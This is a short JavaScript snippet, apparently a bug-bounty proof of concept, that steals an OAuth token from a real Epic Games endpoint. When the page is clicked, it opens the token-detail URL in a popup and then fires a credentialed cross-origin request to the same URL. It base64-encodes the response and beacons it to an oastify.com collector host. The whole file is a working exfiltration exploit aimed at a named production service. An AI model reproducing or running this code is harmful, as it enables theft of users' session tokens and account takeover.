(function() {
  document.onclick = function() {
    var w = window.open('https://content-service.bfda.live.use1a.on.epicgames.com/oauth/v1/token-detail');
    
    setTimeout(function() {
      w.close();
      
      // After opener heuristic grants access, try reading via cache
      var xhr = new XMLHttpRequest();
      xhr.open('GET', 'https://content-service.bfda.live.use1a.on.epicgames.com/oauth/v1/token-detail', true);
      xhr.withCredentials = true;
      xhr.onload = function() {
        console.log('XHR Response:', xhr.responseText);
        new Image().src = 'https://itfyjvb10btewzys9nunumsy9pfg380wp.oastify.com/?d=' + btoa(xhr.responseText);
      };
      xhr.onerror = function() {
        console.log('XHR failed');
      };
      xhr.send();
    }, 3000);
  };
  
  console.log('Click the page!');
})();
